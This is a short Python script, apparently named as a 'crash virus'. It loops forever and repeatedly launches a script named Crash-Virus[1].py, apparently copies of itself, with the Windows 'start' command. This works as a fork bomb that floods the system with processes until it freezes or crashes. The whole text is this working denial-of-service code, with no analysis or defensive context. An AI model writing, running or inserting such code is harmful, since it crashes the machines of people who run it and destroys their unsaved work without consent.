import os
# 主程式-------------------------------------------------------->
while 0==0:
 	os.system("start Crash-Virus[1].py")